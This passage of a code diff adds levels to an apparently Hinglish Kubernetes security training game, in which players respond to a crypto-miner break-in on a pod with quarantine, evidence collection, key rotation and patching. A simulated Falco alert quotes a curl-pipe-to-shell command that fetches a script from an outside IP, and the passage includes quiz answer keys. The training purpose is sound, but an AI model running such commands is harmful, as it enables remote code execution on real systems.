+         <li><b>Raaz badlo</b> — us pod ka token jo-jo padh sakta tha, sab rotate karo.</li>
+         <li><b>Wajah band karo</b> — kamzor image ko patch karo.</li>
+         <li><b>Ab hatao</b> — quarantine pod ko delete karo.</li>
+       </ol>
+       <p><b>Sabse aam galti:</b> pod ko <b>turant delete</b> kar dena. Teen nuksaan: saboot gaya, attacker kaise aaya pata nahi chala,
+       aur Deployment ne wahi kamzor image ka naya pod bana diya — attacker 5 minute mein wapas.</p>`,
+    ],
+    stages: [
+      {
+        type: 'triage',
+        title: '🩺 Case: raat 2:14 ke teen alert',
+        instructions: 'Commands chuno. Har command asli output deta hai. Saare clue milne par sawal khulega.',
+        symptom: `Slack ke <code>#security</code> channel mein Falco ke <b>3 alert</b> aaye hain, sab <code>notify-5c9d4f-k3</code> pod se, raat 2:14 par.<br>
+          Monitoring dashboard par sab hara hai: pod <code>Running</code>, <code>1/1 Ready</code>, koi restart nahi.`,
+        commands: [
+          { cmd: 'kubectl logs -n falco ds/falco | grep notify-5c9d4f-k3', clue: true,
+            out: '02:14:07 Notice  A shell was spawned in a container with an attached terminal\n         (user=root container=notify shell=sh parent=node cmdline=sh -c "curl -s http://185.220.x.x/a.sh | sh")\n02:14:09 Error   File below a known binary directory opened for writing\n         (file=/usr/bin/kworkerd container=notify)\n02:14:15 Warning Outbound connection to common miner pool port\n         (dest=185.220.x.x:3333 proc=kworkerd container=notify)',
+            note: 'Teeno alert ek kahani hain: (1) notify ke Node process ne ek shell chalaya jisne bahar se script utaari, (2) script ne <code>/usr/bin/kworkerd</code> naam ka program likha, (3) woh program mining pool ke port 3333 se jud gaya.' },
+          { cmd: 'kubectl top pod notify-5c9d4f-k3', clue: true,
+            out: 'NAME               CPU(cores)   MEMORY(bytes)\nnotify-5c9d4f-k3   1980m        310Mi',
+            note: 'notify ka aam CPU ~150m hai. Abhi <b>1980m</b> — lagbhag 2 poore core. Crypto miner yahi karta hai: jitna CPU mile, sab kha jaata hai.' },
+          { cmd: 'trivy image --severity CRITICAL chaipay/notify:2.3.0', clue: true,
+            out: 'chaipay/notify:2.3.0 (node-pkg)\nTotal: 1 (CRITICAL: 1)\n\n│ Library       │ Severity │ Installed │ Fixed │ Title                                       │\n│ tmpl-renderer │ CRITICAL │ 4.1.2     │ 4.1.5 │ Remote code execution via crafted template  │',
+            note: 'Ghusne ka raasta: notify ki template library mein <b>remote code execution</b> ki kamzori. Fix maujood hai (4.1.5), par image 2.3.0 mein purana version hai.' },
+          { cmd: 'kubectl get pod notify-5c9d4f-k3', clue: false,
+            out: 'NAME               READY   STATUS    RESTARTS   AGE\nnotify-5c9d4f-k3   1/1     Running   0          6d',
+            note: 'Kubernetes ke hisaab se sab theek: Running, Ready, 0 restart. Kubernetes behaviour nahi dekhta.' },
+          { cmd: 'kubectl get events --field-selector involvedObject.name=notify-5c9d4f-k3', clue: false,
+            out: 'No resources found in payments namespace.',
+            note: 'Koi event nahi. Attacker ne pod ko crash nahi kiya, isliye Kubernetes ke paas batane ko kuch nahi.' },
+        ],
+        questions: [
+          {
+            q: 'Kya hua hai?',
+            choices: [
+              'notify mein memory leak hai; isi wajah se CPU badh gaya aur Falco ne galat alert diya',
+              'Attacker ne notify ki library ki kamzori se pod mein command chalaya aur crypto miner laga diya',
+              'Kisi developer ne debug ke liye kubectl exec kiya; teeno alert usi ke hain',
+              'Node par disk bhar gayi; kworkerd Linux ka apna process hai jo disk saaf kar raha hai',
+            ],
+            answer: 1,
+            explain: 'Shell ka parent <code>node</code> (app ka process) hai, kubectl exec nahi. Script bahar ke IP se aayi. Naya binary likha gaya aur port 3333 (mining) par connection bana. CPU 13 guna. Yeh debug nahi, hamla hai.',
+          },
+          {
+            q: 'Kubernetes ka dashboard hara kyun tha?',
+            choices: [
+              'Kyunki Kubernetes sirf container ka chalna aur probes dekhta hai',
+              'Kyunki attacker ne Kubernetes ke events ko mita diya tha',
+              'Kyunki Falco ne pod ko pehle hi theek kar diya tha',
+              'Kyunki metrics-server band tha aur CPU ka number aaya hi nahi',
+            ],
+            answer: 0,
+            explain: 'Liveness/readiness probes app ki sehat dekhte hain, suraksha nahi. Miner ke saath bhi notify SMS bhej raha tha. Isi liye runtime detection ek alag deewar hai.',
+          },
+        ],
+      },
+      {
+        type: 'incident',
+        title: '🚨 Compromise hua pod — har mod par ek faisla',
+        pager: '<b>Falco: 3 alerts</b> — pod <code>notify-5c9d4f-k3</code>, namespace <code>payments</code><br>Shell + naya binary + mining pool se connection. Raat 2:14.',
+        start: 'n1',
+        nodes: {
+          n1: {
+            sitrep: 'notify-5c9d4f-k3   1/1   Running   CPU 1980m\nDeployment notify: replicas 1, image chaipay/notify:2.3.0',
+            text: 'Attacker pod ke andar hai. Pehla kadam?',
+            choices: [
+              { t: 'kubectl delete pod notify-5c9d4f-k3 — attacker ko turant bahar nikaalo', good: false, explain: 'Saboot gaya. Aur Deployment wahi kamzor image ka naya pod banayega — attacker usi raaste se 5 minute mein wapas. Tumhe yeh bhi nahi pata chalega ki woh kya le gaya.' },
+              { t: 'Pod ko zinda rakho, par alag karo: label hatao aur network kaat do', good: true, next: 'n2', explain: 'Alag karna (quarantine) dono kaam karta hai: attacker ka kaam rukta hai, aur saboot zinda rehta hai. Label hatne par ReplicaSet ek naya pod bana deta hai, toh notify chalta rehta hai.' },
+              { t: 'Kuch mat karo; subah security team ke aane ka intezaar karo', good: false, explain: 'Attacker ke paas notify ka token aur network hai. Har minute woh aur aage ja sakta hai (Secrets, doosre pods). Alag karna abhi ka kaam hai.' },
+            ],
+          },
+          n2: {
+            sitrep: '$ kubectl label pod notify-5c9d4f-k3 app- quarantine=true\n$ kubectl apply -f quarantine-netpol.yaml\n\nnotify-5c9d4f-k3   quarantine=true   (Service se bahar, network band)\nnotify-5c9d4f-n9   app=notify        (ReplicaSet ka naya pod — wahi image 2.3.0)',
+            text: 'Pod alag ho gaya. Ab?',
+            choices: [
+              { t: 'Saboot ikattha karo, phir dekho ki notify ka token kya-kya padh sakta tha', good: true, next: 'n3', explain: 'Do sawal: "kaise aaya" (saboot) aur "kya le gaya hoga" (token ki ijaazat). Doosre sawal ka jawab: kubectl auth can-i --list --as=system:serviceaccount:payments:notify-sa' },
+              { t: 'Ab kaam ho gaya — pod alag hai, baaki subah dekhenge', good: false, explain: 'Do cheezein bachi hain jo intezaar nahi kar sakti: attacker jo raaz padh chuka hai, aur naya pod jo usi kamzor image par chal raha hai.' },
+              { t: 'Quarantine pod ke andar kubectl exec karke miner process ko maar do', good: false, explain: 'Tum saboot ko badal rahe ho, aur attacker ke banaye mahaul mein command chala rahe ho. Pod pehle hi network se kata hai — miner ab kuch nahi kar sakta.' },
+            ],
+          },
+          n3: {
+            sitrep: '$ kubectl auth can-i --list --as=system:serviceaccount:payments:notify-sa\nsecrets      [sms-provider-key]   [get]\nconfigmaps   [notify-templates]   [get]',
+            text: 'notify ka token ek Secret padh sakta tha: sms-provider-key. Kya karoge?',
+            choices: [
+              { t: 'Kuch nahi — attacker sirf miner chala raha tha, use Secret mein dilchaspi nahi hogi', good: false, explain: 'Tum attacker ka irada nahi jaante. Niyam: jo raaz attacker padh SAKTA tha, use padha hua maano.' },
+              { t: 'sms-provider-key ko rotate karo: provider se nayi key lo aur purani ko band karo', good: true, next: 'n4', explain: 'Yahan least privilege ka faayda dikhta hai: sirf EK key badalni hai. Agar notify-sa ke paas "sab kuch" hota, toh payments ke saare raaz badalne padte.' },
+              { t: 'Poore cluster ke saare Secrets rotate karo, ehtiyaat ke taur par', good: false, explain: 'Token ki ijaazat saaf dikh rahi hai: sirf ek Secret. Sab kuch rotate karna ghanton ka kaam aur naya khatra hai — bina kisi faayde ke.' },
+            ],
+          },
+          n4: {
+            sitrep: 'sms-provider-key: rotated ✓\nnotify-5c9d4f-n9 (naya pod): image chaipay/notify:2.3.0  ← wahi kamzori',
+            text: 'Raaz badal gaya. Naya notify pod abhi bhi kamzor image par hai. Aakhri kadam?',
+            choices: [
+              { t: 'notify ko patched image (2.3.1) par deploy karo; phir quarantine pod delete karo', good: true, next: 'end', explain: 'Wajah band (patched image), phir safai (quarantine pod delete — saboot pehle hi ikattha ho chuka hai). Yahi kram hai.' },
+              { t: 'Quarantine pod ko delete karo; image baad mein kisi din patch kar lenge', good: false, explain: 'Naya pod usi darwaze ke saath khada hai jisse attacker aaya tha. Wahi hamla dobara hoga.' },
+              { t: 'notify Deployment ko 0 replicas par kar do aur wahin chhod do', good: false, explain: 'Hamla ruk jayega, par ChaiPay ke SMS bhi. Fix maujood hai (2.3.1) — service band karna aakhri raasta hai, pehla nahi.' },
+            ],
+          },
+          end: {
+            end: true,
+            text: 'Ghatna sambhal gayi',
+            summary: '<b>Paanch kadam, isi kram mein:</b> (1) <b>alag karo</b> — delete nahi. (2) <b>saboot</b> + "token kya padh sakta tha". (3) <b>raaz badlo</b> — jo padha ja sakta tha, use padha hua maano. (4) <b>wajah band</b> — patched image. (5) <b>ab hatao</b>.<br><br>Aur dekho pehle ke levels ne kya bachaya: <b>least privilege</b> ki wajah se sirf ek key badalni padi. <b>Image scan</b> CI mein hota toh 2.3.0 release hi nahi hoti.',
+          },
+        },
+      },
+    ],
+    interview: {
+      title: 'Interview Round — detection aur response',
+      instructions: 'Interviewer dekhega ki tum ghabrahat mein pod delete karte ho ya sochte ho. 🎤',
+      questions: [
+        {
+          q: '"Admission policy aur image scanning hai. Phir runtime detection (Falco) kyun?"',
+          choices: [
+            'Falco admission policy se tez hai, isliye policy ki jagah le sakta hai',
+            'Policy aur scan darwaze par hain; chalte container ki harkat sirf runtime detection dekhta hai',
+            'Falco images ko scan karta hai, isliye Trivy ki zaroorat nahi rehti',
+            'Runtime detection sirf compliance ke kaagaz ke liye hota hai; asal mein kuch nahi pakadta',
+          ],
+          answer: 1,
+          explain: 'Scan sirf jaani hui kamzoriyan pakadta hai; policy sirf object ka roop dekhti hai. Nayi (zero-day) kamzori, chori hue credentials, ya andar ka galat istemal — in sab mein image "saaf" aur YAML "sahi" hota hai. Tab sirf behaviour bacha hai.',
+        },
+        {
+          q: '"Ek pod compromise ho gaya. Tum use turant delete kyun nahi karte?"',
+          choices: [
+            'Kyunki delete karne par Kubernetes poore namespace ko bhi delete kar deta hai',
+            'Kyunki saboot chala jaata hai aur Deployment wahi kamzor image ka naya pod bana deta hai',
+            'Kyunki compromise hua pod delete ho hi nahi sakta jab tak attacker andar hai',
+            'Kyunki delete karne se pod ka ServiceAccount bhi delete ho jaata hai',
+          ],
+          answer: 1,
+          explain: 'Delete = saboot khatam + wajah zinda. Sahi kram: alag karo (label + NetworkPolicy), saboot lo, raaz badlo, image patch karo, phir delete.',
+        },
+        {
+          q: '"Pod ko \'alag karna\' (quarantine) Kubernetes mein kaise karte ho?"',
+          choices: [
+            'Node ko cordon karke — cordon se us node ke saare pods ka network band ho jaata hai',
+            'Pod ke Deployment ko 0 replicas par scale karke',
+            'Pod ka label badal kar aur us label par deny-all NetworkPolicy lagakar',
+            'Pod ko kubectl exec se andar jaakar network interface band karke',
+          ],
+          answer: 2,
+          explain: 'Label hatne se pod Service ke Endpoints se nikal jaata hai (traffic band) aur ReplicaSet use apna nahi maanta (naya pod banata hai, service chalti rehti hai). NetworkPolicy us pod ka andar-bahar ka saara network kaat deti hai. Pod zinda rehta hai — saboot ke liye.',
+        },
+      ],
+    },
+    success: [
+      'Main bata sakta hoon ki Kubernetes ko kya dikhta hai aur kya nahi',
+      'Main Falco ke alerts padh kar hamle ki kahani jod sakta hoon',
+      'Main compromise hue pod ka jawab sahi kram mein de sakta hoon',
+    ],
+    homework: `<p>Apne cluster ke liye ek chhoti si "ghatna ki parchi" likho aur kahin chipka do:</p>
+      <pre>1. ALAG:   kubectl label pod &lt;pod&gt; app- quarantine=true
+           kubectl apply -f quarantine-netpol.yaml
+2. SABOOT: kubectl logs &lt;pod&gt; &gt; logs.txt ; kubectl get pod &lt;pod&gt; -o yaml &gt; pod.yaml
+3. RAAZ:   kubectl auth can-i --list --as=system:serviceaccount:&lt;ns&gt;:&lt;sa&gt;   → rotate
+4. WAJAH:  patched image deploy
+5. HATAO:  kubectl delete pod &lt;pod&gt;</pre>`,
+    cards: [
+      /* (boss level is file ke aakhir mein alag registerLevels call mein hai) */
+      { front: 'Kubernetes ko pod ke baare mein kya dikhta hai, aur kya nahi?', back: 'Dikhta hai: container chal raha hai, probes paas. Nahi dikhta: andar ki harkat (shell, miner, bahar ke connection).' },
+      { front: 'Falco kya sunta hai, aur kya karta hai?', back: 'Har node par kernel ke <b>syscalls</b> (eBPF se). Rules se milakar <b>alert</b> bhejta hai. Falco rokta nahi.' },
+      { front: 'Compromise hue pod ke 5 kadam?', back: 'Alag karo → saboot → raaz badlo → wajah band (patch) → ab hatao.' },
+      { front: 'Pod ko quarantine karne ke do commands?', back: '<code>kubectl label pod POD app- quarantine=true</code> + <code>quarantine=true</code> par deny-all NetworkPolicy.' },
+      { front: 'Compromise hue pod ko turant delete kyun nahi?', back: 'Saboot gaya, aur Deployment wahi kamzor image ka naya pod bana deta hai — attacker wapas.' },
+    ],
+  },
+]);
+
+/* ------------------------------------------------------------------ */
+/* LEVEL 5 — BOSS                                                      */
+/* ------------------------------------------------------------------ */
+VISUALS['sec-boss'] = {
+  t: 'Chaar deewarein — attacker ko har padav par kya rokta hai',
+  scene: {
+    intro: 'Is track ki chaar deewarein ek hi hamle ke raaste par khadi hain. Dekho attacker har deewar par kahan atakta hai.',
+    aria: 'chaar suraksha deewarein: image ki jaanch, admission policy, least privilege, runtime detection — 5 kadam',
+    nodes: [
+      { id: 'bad', col: 0, row: 0, icon: '🦹', label: 'Attacker', sub: 'bahar se', tone: 'bad' },
+      { id: 'img', col: 1, row: 0, icon: '📦', label: 'Image ki jaanch', sub: 'scan + signature', tone: 'gold', about: 'Deewar 1. Jaani hui kamzori wali image release hi na ho; bahar ki image chale hi na.' },
+      { id: 'pol', col: 2, row: 0, icon: '🛂', label: 'Admission policy', sub: 'root / privileged mana', tone: 'gold', about: 'Deewar 2. Pod ka roop: root nahi, privileged nahi, latest nahi. Attacker andar aa bhi jaye toh container se node tak pahunchna mushkil.' },
+      { id: 'rbac', col: 2, row: 1, icon: '🪪', label: 'Least privilege', sub: 'token ki chhoti ijaazat', tone: 'gold', about: 'Deewar 3. Pod ka token sirf wahi kar sake jo app ko chahiye. NetworkPolicy se pod sirf wahin pahunche jahan zaroori hai.' },
+      { id: 'rt', col: 1, row: 1, icon: '🦅', label: 'Runtime nazar', sub: 'Falco + jawab', tone: 'accent', about: 'Deewar 4. Jo teen deewarein paar kar gaya, uski harkat pakadna aur sahi kram mein jawab dena.' },
+      { id: 'data', col: 0, row: 1, icon: '🗝️', label: 'Asli maal', sub: 'Secrets, database', tone: 'good', about: 'Attacker ka asli nishana: passwords, keys, customers ka data.' },
+    ],
+    steps: [
+      { from: 'bad', to: 'img', label: 'kamzor library', tone: 'bad', say: '<b>Attacker</b> ek jaani hui kamzori dhoondhta hai. <b>Image ki jaanch</b> (scan CI mein, signature darwaze par) is kamzori wali image ko release hone se rokti. Yeh deewar kamzor ho toh attacker pod ke andar aa jaata hai.' },
+      { from: 'img', to: 'pol', label: 'pod ke andar', tone: 'bad', say: 'Attacker pod ke andar hai. <b>Admission policy</b> ne pehle hi tay kar diya tha ki pod root nahi chalega aur privileged nahi hoga. Isliye attacker container se node tak nahi kood sakta.' },
+      { from: 'pol', to: 'rbac', label: 'token churaya', tone: 'bad', say: 'Attacker pod ka token churata hai. <b>Least privilege</b> ki wajah se token sirf ek ConfigMap aur ek Secret padh sakta hai. NetworkPolicy ki wajah se pod database tak pahunch hi nahi sakta.' },
+      { from: 'rbac', to: 'rt', label: 'ajeeb harkat', tone: 'bad', say: 'Attacker miner chalata hai. <b>Runtime nazar</b> (Falco) shell, naya binary aur mining pool ka connection pakad leti hai. On-call ko page milta hai.' },
+      { from: 'rt', to: 'data', label: 'bach gaya', tone: 'good', say: 'Tumhara jawab — alag karo, saboot, raaz badlo, patch, hatao — attacker ko <b>Asli maal</b> tak pahunchne se pehle rok deta hai. Koi ek deewar poori nahi hoti. Chaaron milkar attacker ka kaam mehenga aur shor-sharaabe wala bana deti hain.' },
+    ],
+  },
+};
+
+const QP = 'notify-5c9d4f-k3';
+const T_SECBOSS = [
+  { text: 'Pehle <b>saboot</b> ikattha karo (<code>bash collect-evidence.sh</code>)', check: s => !!s.cluster.evidence },
+  { text: `Pod <code>${QP}</code> ko Service aur ReplicaSet se <b>alag</b> karo (label <code>app-</code> aur <code>quarantine=true</code>)`, check: s => !!s.cluster.isolated },
+  { text: 'Alag kiye pod ka <b>network kaato</b> (NetworkPolicy)', check: s => !!s.cluster.netpol && !!s.cluster.isolated },
+  { text: 'Dekho notify ka token kya-kya padh sakta tha (<code>kubectl auth can-i --list --as=…</code>)', check: s => !!s.cluster.sawAccess },
+  { text: 'Jo raaz padha ja sakta tha, use <b>badlo</b>', check: s => !!s.cluster.rotated },
+  { text: '<b>Wajah band karo</b>: notify ko patched image par le jao', check: s => !!s.cluster.patched },
+  { text: 'Ab alag kiye pod ko <b>delete</b> karo', check: s => !!s.cluster.deleted },
+];
+function quarantine(s, full) {
+  const c = s.cluster, p = c.pods.find(x => x.name === QP);
+  if (!p) return `Error from server (NotFound): pods "${QP}" not found`;
+  if (!full) { p.labels = { app: 'notify', quarantine: 'true' }; return `pod/${QP} labeled\n(label quarantine=true lag gaya, par label app=notify ABHI BHI hai. Pod abhi bhi Service notify-svc ke peeche hai aur traffic le raha hai. app- bhi jodo: kubectl label pod ${QP} app- quarantine=true)`; }
+  if (c.isolated) return `pod/${QP} not labeled`;
+  c.isolated = true;
+  p.labels = { quarantine: 'true' };
+  c.pods.push({ name: 'notify-5c9d4f-n9', ready: '1/1', status: 'Running', restarts: 0, age: '8s', node: 'node-1', ip: '10.244.1.52', top: '150m 92Mi', labels: { app: 'notify' } });
+  c.endpoints[0].endpoints = '10.244.1.52:8080';
+  return `pod/${QP} unlabeled\npod/${QP} labeled\n(label app=notify hata → pod Service notify-svc ke Endpoints se bahar, aur ReplicaSet ne use apna maanna chhod diya.\n ReplicaSet ne turant naya pod notify-5c9d4f-n9 banaya — notify ke SMS chalte rahenge. Dhyaan do: naya pod bhi purani image 2.3.0 par hai.)`;
+}
+
+KG.registerLevels('secure', [
+  {
+    id: 'sec-boss',
+    icon: '👑',
+    title: 'BOSS: raat 2:14 — notify pod mein attacker',
+    badge: 'Kavach Karta',
+    objectives: [
+      'Compromise hue pod ko sahi kram mein sambhalna — poora, haath se',
+      'Least privilege ka faayda ghatna ke waqt dekhna',
+      'Image scan se ghusne ka raasta dhoondhna aur band karna',
+      'Chaaron deewaron ko ek kahani mein jodna',
+    ],
+    lesson: [
+      `<h3>👑 Boss level: ab tum on-call ho</h3>
+       <p>Pichhle level mein tumne faisle <b>chune</b> the. Is level mein tum unhe <b>khud chalaoge</b>, asli commands se.</p>
+       <p><b>Kahani:</b> raat 2:14. Falco ne <code>notify-5c9d4f-k3</code> pod se teen alert bheje: shell, naya binary, mining pool ka connection.
+       Pod <code>Running</code> hai. CPU 1980m.</p>
+       <p><b>Kram (yaad hai?):</b></p>
+       <ol>
+         <li>🗂️ Saboot</li>
+         <li>🚧 Alag karo — label + network</li>
+         <li>🔍 Token kya padh sakta tha?</li>
+         <li>🔑 Raaz badlo</li>
+         <li>🩹 Wajah band karo (patch)</li>
+         <li>🗑️ Ab hatao</li>
+       </ol>
+       <p>Is mission mein saboot ko pehle rakha gaya hai: pod alag karne se pehle uski chalti haalat ka ek record le lo.</p>`,
+    ],
+    stages: [
+      {
+        type: 'terminal',
+        title: '🖥️ Boss Mission: attacker ko gherna',
+        instructions: 'Tum on-call ho. Pod ko delete karne ki jaldi mat karo — simulator rok dega aur wajah batayega.',
+        goal: `Pod <code>${QP}</code> compromise ho chuka hai. Ise <b>sahi kram mein</b> sambhalo.<br>
+          Kaam ke roop: <code>kubectl label pod ${QP} app- quarantine=true</code> ·
+          <code>kubectl auth can-i --list --as=${SA}</code> · <code>trivy image chaipay/notify:2.3.0</code> · files ke liye <code>ls</code>.`,
+        tasks: T_SECBOSS,
+        cluster: {
+          nodes: [{ name: 'node-1', status: 'Ready', roles: '<none>', age: '40d', version: 'v1.33.4' }],
+          pods: [
+            { name: QP, ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.21', top: '1980m 310Mi', labels: { app: 'notify' },
+              logs: 'notify: sent 212 SMS in last minute\nnotify: template render: unexpected token in "{{#with constructor}}"\nnotify: sent 198 SMS in last minute\n(dhyaan do: ek ajeeb template — yahin se attacker ne command chalaya)',
+              describe: `Name:             ${QP}\nNamespace:        payments\nService Account:  notify-sa\nLabels:           app=notify\nStatus:           Running\nContainers:\n  notify:\n    Image:  chaipay/notify:2.3.0` },
+            { name: 'pay-api-6b8d7c-a1', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.20', top: '410m 600Mi', labels: { app: 'pay-api' } },
+            { name: 'ledger-0', ready: '1/1', status: 'Running', restarts: 0, age: '9d', node: 'node-1', ip: '10.244.1.30', top: '220m 900Mi', labels: { app: 'ledger' } },
+          ],
+          deployments: [{ name: 'notify', ready: '1/1', upToDate: 1, available: 1, age: '40d' }, { name: 'pay-api', ready: '1/1', upToDate: 1, available: 1, age: '40d' }],
+          services: [{ name: 'notify-svc', type: 'ClusterIP', clusterIP: '10.96.15.2', ports: '8080/TCP', age: '40d' }],
+          endpoints: [{ name: 'notify-svc', endpoints: '10.244.1.21:8080', age: '40d' }],
+          networkpolicies: [],
+        },
+        responses: [
+          { re: new RegExp('^kubectl delete (pods?|po)[ /]' + QP + '\\b'),
+            mutate: s => {
+              const c = s.cluster;
+              if (!c.evidence || !c.isolated || !c.patched) { c.lastDel = null; return; }
+              const i = c.pods.findIndex(x => x.name === QP);
+              if (i > -1) c.pods.splice(i, 1);
+              c.deleted = true; c.lastDel = `pod "${QP}" deleted`;
+            },
+            out: s => s.cluster.lastDel || ('(simulator ne roka) Abhi delete mat karo. ' +
+              (!s.cluster.evidence ? 'Saboot ikattha nahi hua — delete karte hi pod ke logs aur haalat hamesha ke liye gaye.'
+               : !s.cluster.isolated ? 'Pod abhi bhi ReplicaSet ka hai — delete karoge toh ReplicaSet wahi kamzor image ka naya pod bana dega, aur tumhare paas jaanchne ko kuch nahi bachega.'
+               : 'notify abhi bhi kamzor image 2.3.0 par chal raha hai. Pehle wajah band karo (patched image), phir safai.')) },
+          { re: new RegExp('^kubectl label (pods?|po)[ /]' + QP + '\\b(?=.*\\bquarantine=true\\b)(?=.*(^| )app-( |$))'), mutate: s => { s.cluster.lastLabel = quarantine(s, true); }, out: s => s.cluster.lastLabel || '' },
+          { re: new RegExp('^kubectl label (pods?|po)[ /]' + QP + '\\b(?=.*\\bquarantine=true\\b)'), mutate: s => { s.cluster.lastLabel = quarantine(s, false); }, out: s => s.cluster.lastLabel || '' },
+          { re: new RegExp('^kubectl label (pods?|po)[ /]' + QP + '\\b'), err: true, out: `Do badlaav chahiye, ek hi command mein:\n  app-             → label app hatao (Service aur ReplicaSet se bahar)\n  quarantine=true  → naya label (isi par NetworkPolicy lagegi)\nRoop: kubectl label pod ${QP} app- quarantine=true` },
+          { re: /^kubectl auth can-i --list\b(?=.*--as[= ]system:serviceaccount:payments:notify-sa)/, mutate: s => { s.cluster.sawAccess = true; },
+            out: 'Resources    Non-Resource URLs   Resource Names       Verbs\nsecrets      []                  [sms-provider-key]   [get]\nconfigmaps   []                  [notify-templates]   [get]\n(notify ka token do hi cheezein padh sakta tha. Raaz ek hi hai: sms-provider-key. Ise padha hua maano.)' },
+          { re: /^kubectl auth can-i\b/, err: true, out: 'Roop: kubectl auth can-i --list --as=' + SA },
+          { re: /^trivy image( --\S+( \S+)?)* chaipay\/notify:2\.3\.0$/,
+            out: 'chaipay/notify:2.3.0 (node-pkg)\n\nTotal: 1 (CRITICAL: 1)\n\n│ Library       │ Severity │ Installed │ Fixed │ Title                                       │\n│ tmpl-renderer │ CRITICAL │ 4.1.2     │ 4.1.5 │ Remote code execution via crafted template  │\n(ghusne ka raasta yahi hai. Fix 4.1.5 mein hai — image chaipay/notify:2.3.1 mein yahi version hai.)' },
+          { re: /^trivy image( --\S+( \S+)?)* chaipay\/notify:2\.3\.1$/, out: 'chaipay/notify:2.3.1 (node-pkg)\n\nTotal: 0 (CRITICAL: 0)' },
+          { re: /^trivy\b/, err: true, out: 'Is mission mein: trivy image chaipay/notify:2.3.0   ·   trivy image chaipay/notify:2.3.1' },
+        ],
+        files: {
+          'collect-evidence.sh': {
+            desc: 'Pod ke logs, describe aur YAML ko files mein bachata hai',
+            content: `#!/bin/sh\nP=${QP}\nkubectl logs $P --all-containers --timestamps > evidence-logs.txt\nkubectl describe pod $P                     > evidence-describe.txt\nkubectl get pod $P -o yaml                  > evidence-pod.yaml\nkubectl get events --field-selector involvedObject.name=$P > evidence-events.txt\n# Falco ke alerts bhi saath rakho\nkubectl logs -n falco ds/falco | grep $P    > evidence-falco.txt`,
+            apply: s => { s.cluster.evidence = true; return 'evidence-logs.txt, evidence-describe.txt, evidence-pod.yaml, evidence-events.txt, evidence-falco.txt likh diye gaye.\n(ab pod ke saath kuch bhi ho, yeh record bacha rahega)'; },
+          },
+          'quarantine-netpol.yaml': {
+            desc: 'NetworkPolicy: label quarantine=true wale pods ka andar-bahar ka saara network band',
+            content: 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: quarantine\n  namespace: payments\nspec:\n  podSelector:\n    matchLabels:\n      quarantine: "true"\n  policyTypes: ["Ingress", "Egress"]\n  # koi ingress / egress rule nahi → sab kuch band',
+            apply: s => {
+              const c = s.cluster;
+              if (!c.netpol) { c.netpol = true; c.networkpolicies.push({ name: 'quarantine', podSelector: 'quarantine=true', age: '3s' }); }
+              return 'networkpolicy.networking.k8s.io/quarantine ' + (c.isolated
+                ? 'created\n(quarantine=true wale pod ka saara network band. Miner ab mining pool tak nahi pahunch sakta, aur attacker cluster ke kisi aur pod tak nahi.)'
+                : 'created\n(policy ban gayi, par abhi kisi pod par label quarantine=true nahi hai — policy kisi ko nahi chun rahi. Pod par label lagao.)');
+            },
+          },
+          'rotate-sms-key.sh': {
+            desc: 'SMS provider se nayi key banata hai, Secret sms-provider-key badalta hai, purani key band karta hai',
+            content: '#!/bin/sh\n# 1. provider ke dashboard/API se nayi key\n# 2. kubectl create secret generic sms-provider-key --from-literal=key=NEW --dry-run=client -o yaml | kubectl apply -f -\n# 3. notify ko restart taaki nayi key le\n# 4. provider par PURANI key ko revoke — yeh kadam hi asli hai',
+            apply: s => {
+              const c = s.cluster;
+              if (!c.sawAccess) return '(simulator ne roka) Pehle dekho ki notify ka token kya-kya padh sakta tha. Bina jaane key badloge toh ya toh kuch chhoot jayega, ya zaroorat se zyada badal doge.\n  kubectl auth can-i --list --as=' + SA;
+              c.rotated = true;
+              return 'secret/sms-provider-key configured\nSMS provider: purani key revoked ✓\n(attacker ne key padh bhi li ho, toh ab woh key bekaar hai)';
+            },
+          },
+          'notify-2.3.1.yaml': {
+            desc: 'notify Deployment ko patched image chaipay/notify:2.3.1 par le jaata hai',
+            content: 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notify\n  namespace: payments\nspec:\n  template:\n    spec:\n      containers:\n        - name: notify\n          image: chaipay/notify:2.3.1     # tmpl-renderer 4.1.5 — RCE ka fix',
+            apply: s => {
+              const c = s.cluster;
+              if (c.patched) return 'deployment.apps/notify unchanged';
+              c.patched = true;
+              const keep = c.pods.filter(p => p.name === QP || !/^notify-/.test(p.name));
+              keep.push({ name: 'notify-8e7d6c-p1', ready: '1/1', status: 'Running', restarts: 0, age: '12s', node: 'node-1', ip: '10.244.1.60', top: '148m 90Mi', labels: { app: 'notify' } });
+              c.pods = keep;
+              if (c.isolated) c.endpoints[0].endpoints = '10.244.1.60:8080';
+              return 'deployment.apps/notify configured\n(notify ka naya pod notify-8e7d6c-p1 patched image 2.3.1 par Running hai. Ghusne ka raasta band.)';
+            },
+          },
+        },
+        success: KG.allOf(T_SECBOSS),
+        successText: `Poora kram, tumhare haath se: <b>saboot</b> → <b>alag</b> (label + NetworkPolicy) → <b>token ki pahunch</b> → <b>raaz badla</b> → <b>patch</b> → <b>delete</b>.<br>
+          <b>Do baatein dekho:</b> (1) Label hatate hi ReplicaSet ne naya pod bana diya — notify ek second ke liye bhi band nahi hua. (2) Least privilege ki wajah se sirf <b>ek</b> key badalni padi.<br>
+          <b>Kal subah ka kaam:</b> CI mein Trivy ka darwaza (CRITICAL par build fail), taaki 2.3.0 jaisi image agli baar release hi na ho.`,
+        hints: [
+          'bash collect-evidence.sh, phir kubectl label pod ' + QP + ' app- quarantine=true, phir kubectl apply -f quarantine-netpol.yaml',
+          'kubectl auth can-i --list --as=' + SA + ' → sms-provider-key. Phir bash rotate-sms-key.sh',
+          'trivy image chaipay/notify:2.3.0 → fix 2.3.1 mein. kubectl apply -f notify-2.3.1.yaml, aur aakhir mein kubectl delete pod ' + QP,
+        ],
+        solution: [
+          'kubectl get pods',
+          'kubectl top pods',
+          'bash collect-evidence.sh',
+          `kubectl label pod ${QP} app- quarantine=true`,
+          'kubectl apply -f quarantine-netpol.yaml',
+          'kubectl auth can-i --list --as=' + SA,
+          'bash rotate-sms-key.sh',
+          'trivy image chaipay/notify:2.3.0',
+          'kubectl apply -f notify-2.3.1.yaml',
+          `kubectl delete pod ${QP}`,
+        ],
+      },
+      {
+        type: 'bins',
+        title: 'Kaun si deewar yeh rokti?',
